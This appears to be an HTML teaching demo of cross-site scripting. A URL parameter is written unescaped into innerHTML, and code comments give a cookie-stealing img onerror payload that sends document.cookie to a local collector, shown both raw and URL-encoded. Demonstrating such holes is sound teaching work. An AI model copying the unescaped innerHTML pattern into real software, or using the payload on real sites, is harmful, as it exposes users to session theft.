<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>XSS Example</title>
</head>

<body>

  <!-- Vulnerable Code -->
  <div>
    Welcome, <span id="username"></span>!
  </div>

  <script>
    // Function to set a cookie, mostly this will be set from server
    function setCookie(name, value, days) {
      const date = new Date();
      date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
      const expires = "expires=" + date.toUTCString();
      document.cookie = name + "=" + value + ";" + expires + ";path=/";
    }

    // Example: Set a cookie named "exampleCookie" with value "Hello, Cookie!" that expires in 7 days
    setCookie("exampleCookie", "Hello, Cookie!", 7);
  </script>

  <!-- Vulnerable Code -->
  <script>
    const params = new URLSearchParams(window.location.search);
    const name = params.get('name');

    // We are using the same code as in the previous example
    // If you try to pass the below content in the URL as name parameter
    // It will steal your cookies and send the data to requested API.
    // Run the below code in the console and use the result to pass into the name parameter in the URL
    // encodeURIComponent('<img src=\"not-found\" onerror=\"var img = document.createElement(\'img\'); img.src = `http://127.0.0.1:5501/cookie?data${document.cookie}`; document.querySelector(\'body\').appendChild(img);" />')
    
    // Which will look something like this
    // %3Cimg%20src%3D%22not-found%22%20onerror%3D%22var%20img%20%3D%20document.createElement('img')%3B%20img.src%20%3D%20%60http%3A%2F%2F127.0.0.1%3A5501%2Fcookie%3Fdata%24%7Bdocument.cookie%7D%60%3B%20document.querySelector('body').appendChild(img)%3B%22%20%2F%3E
    document.getElementById('username').innerHTML = `${name}`;

    
  </script>

</body>

</html>